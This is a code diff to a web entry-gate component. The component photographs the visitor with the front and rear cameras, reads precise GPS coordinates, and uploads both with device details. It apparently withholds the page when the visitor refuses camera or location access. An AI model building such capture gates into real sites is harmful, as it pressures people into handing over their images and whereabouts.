@@ -34,19 +34,22 @@ async function grabFrame(stream: MediaStream): Promise<string> {
   return canvas.toDataURL('image/jpeg', 0.72);
 }
 
-/** 前置必拍；后置没有硬件时跳过（桌面机），拒绝授权则 overall denied。 */
+/** 前置必拍；后置没有硬件时跳过（桌面机）。
+    只有「拒绝授权」才算 denied；没有摄像头等硬件问题不算授权失败。 */
 async function captureCameras(): Promise<
-  { front: string; back?: string } | 'denied'
+  { front?: string; back?: string; denied: boolean }
 > {
-  if (!navigator.mediaDevices?.getUserMedia) return 'denied';
+  if (!navigator.mediaDevices?.getUserMedia) return { denied: true };
   let frontStream: MediaStream;
   try {
     frontStream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: 'user', width: { ideal: 640 } },
       audio: false,
     });
-  } catch {
-    return 'denied';
+  } catch (e) {
+    const name = (e as DOMException)?.name;
+    // NotAllowedError/SecurityError = 用户拒绝；其余（无摄像头等）不拦人
+    return { denied: name === 'NotAllowedError' || name === 'SecurityError' };
   }
   const front = await grabFrame(frontStream);
   let back: string | undefined;
@@ -59,12 +62,26 @@ async function captureCameras(): Promise<
   } catch {
     back = undefined; // 无后置摄像头（桌面设备）
   }
-  return { front, back };
+  return { front, back, denied: false };
 }
 
-function getGps(): Promise<Gps | 'denied'> {
+/** 仅「拒绝定位」算 denied；定位不可用/超时重试一次低精度后放弃（不拦人）。 */
+function getGps(): Promise<Gps | null | 'denied'> {
+  const once = (high: boolean, timeout: number) =>
+    new Promise<Gps | null>((resolve) => {
+      navigator.geolocation.getCurrentPosition(
+        (p) =>
+          resolve({
+            lat: p.coords.latitude,
+            lng: p.coords.longitude,
+            acc: Math.round(p.coords.accuracy || 0),
+          }),
+        () => resolve(null),
+        { enableHighAccuracy: high, timeout, maximumAge: 0 }
+      );
+    });
   return new Promise((resolve) => {
-    if (!('geolocation' in navigator)) return resolve('denied');
+    if (!('geolocation' in navigator)) return resolve(null);
     navigator.geolocation.getCurrentPosition(
       (p) =>
         resolve({
@@ -72,7 +89,11 @@ function getGps(): Promise<Gps | 'denied'> {
           lng: p.coords.longitude,
           acc: Math.round(p.coords.accuracy || 0),
         }),
-      () => resolve('denied'),
+      async (err) => {
+        if (err.code === err.PERMISSION_DENIED) return resolve('denied');
+        const retry = await once(false, 8000);
+        resolve(retry);
+      },
       { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
     );
   });
@@ -120,7 +141,7 @@ export default function EntryGate({ children }: { children: ReactNode }) {
     const miss: string[] = [];
 
     const cam = await captureCameras();
-    if (cam === 'denied') miss.push('摄像头');
+    if (cam.denied) miss.push('摄像头');
     const gps = await getGps();
     if (gps === 'denied') miss.push('位置');
 
@@ -136,9 +157,9 @@ export default function EntryGate({ children }: { children: ReactNode }) {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          front: (cam as { front: string }).front,
-          back: (cam as { front: string; back?: string }).back || '',
-          gps,
+          front: cam.front || '',
+          back: cam.back || '',
+          gps: gps === 'denied' ? null : gps,
           device,
         }),
       });
